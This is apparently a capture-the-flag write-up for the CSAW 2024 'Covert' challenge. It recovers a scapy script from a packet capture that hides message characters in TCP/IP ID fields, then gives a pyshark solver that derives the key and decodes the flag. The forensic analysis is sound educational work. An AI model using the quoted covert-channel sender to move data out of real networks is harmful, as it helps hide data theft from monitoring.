---
title: CSAW 2024 Covert
draft: false
tags:
  - ctf
---

# Covert

> It appears there's been some shady communication going on in our network...

Taking a quick look through the pcap, we notice some HTTP streams. For example, we find one with a Referer of 'https://people.cs.georgetown.edu/~clay/classes/spring2009/555/papers/Embedding_Covert_Channels_into_TCPIP.pdf'. Additionally, we can find what seems to be the script they used to do this covert TCP communication. 

```python
    # ez covert transfer...
    from scapy.all import IP, TCP, send

    key = ??

    dst_ip = &#34;X.X.X.X&#34;
    dst_port = ?????

    src_ip = &#34;X.X.X.X&#34;
    src_port = ?????

    def encode_message(message):
        for letter in message:
            ip = IP(dst=dst_ip, src=src_ip, id=ord(letter)*key)

            tcp = TCP(sport=src_port, dport=dst_port)

            send(ip/tcp)

    encode_message(&#34;????????????&#34;)
```

Quickly grabbing some of the first TCP packets, we can determine the original key.

```python
mapping = {
    ord('c'): 5445,
    ord('s'): 6325,
    ord('a'): 5335
}

# Find key where:
# ord('c') * key = 5445
# ord('s') * key = 6325
# ord('a') * key = 5335

for key in range(10000):
    if key * ord('c') == 5445 and key * ord('s') == 6325 and key * ord('a') == 5335:
        print(key)
        break

KEY = 55

import pyshark

pcap = pyshark.FileCapture('covert.pcapng')

for packet in pcap:
    try:
        ip_id = int(packet.ip.id, 16)
        print(chr(ip_id // KEY), end='')
    except Exception:
        pass
```

This script finds the key using three known characters (csa from the flag format of `csawctf{`). Then we can iterate through the pcap and decode the flag.